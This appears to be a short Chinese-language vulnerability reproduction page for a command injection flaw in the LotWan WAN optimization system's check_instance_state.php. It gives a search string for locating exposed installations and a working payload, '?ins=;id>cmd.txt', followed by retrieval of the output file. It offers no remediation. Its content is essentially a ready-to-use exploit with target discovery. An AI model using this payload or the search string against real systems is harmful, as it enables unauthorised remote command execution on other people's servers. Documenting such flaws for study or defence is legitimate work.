# 华夏创新 LotWan广域网优化系统 check_instance_state.php 远程命令执行漏洞

## 漏洞描述

华夏创新 LotWan广域网优化系统check_instance_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>华夏创新 LotWan广域网优化系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="LotWan 广域网优化系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1635942598942-6671fa50-5052-43f6-ab40-bf2c8403bdf8-20220314123637053.png)

存在漏洞的文件为

```php
/acc/check_instance_state.php?ins=;id>cmd.txt
```

再访问 `/acc/cmd.txt`

![img](../../../.vuepress/public/img/1635943074087-b483f989-38e9-43fd-8e94-6de93605d4a7.png)



若有收获，就点个赞吧